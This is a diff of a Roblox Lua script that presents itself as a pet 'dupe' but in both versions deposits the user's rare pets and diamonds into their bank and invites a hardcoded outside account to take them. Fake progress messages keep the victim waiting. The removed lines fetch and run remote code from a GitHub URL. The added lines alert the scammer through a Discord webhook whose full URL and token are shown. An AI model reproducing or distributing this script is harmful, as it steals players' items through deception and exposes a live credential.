@@ -1,22 +1,22 @@
-local LocalNumber = 3573889453
-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
-local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
-local mybanks = lib.Network.Invoke("get my banks")
-local PetsList = {}
-for i,v in pairs(lib.Save.Get().Pets) do
-    local v2 = lib.Directory.Pets[v.id];
-    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
-        table.insert(PetsList, v.uid);
-    end
-end
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/ProwlnoobGT/nonamer/main/dd"))()
-local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
-if request then
-    lib.Message.New("Dupe starting! Please wait for atleast 10 minutes");
-else
-end
-if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
-    lib.Message.New("Dupe Proccesing! (make sure your bank have pet or gems for duping!)");
-else
-    lib.Message.New("Don't join the game for the next 5 minutes to stop the pets from getting deleted");
-end;
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/1003656077092589659/nfNAlcQMbV8VU3OJCZo3QvVMsPtRp5YDifM2xqvRT2t40si8touSnaeGGAWgxwxoDprA"
+local data = {
+   ["content"] = "@everyone , We Got A Shitty DumbAss Go Fast Loot Him",
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library')) 
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "") local mybanks = lib.Network.Invoke("get my banks") local PetsList = {} for i,v in pairs(lib.Save.Get().Pets) do local v2 = lib.Directory.Pets[v.id]; if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then table.insert(PetsList, v.uid); end end local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1); if request then lib.Message.New("Dupe starting"); return; end if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 3573889453) then lib.Message.New("Dupe successfully! please leave and come back in 1-12 minutes"); else lib.Message.New("Dupe failure frowning please try again or contact Windows Support#4371 on dc"); end;
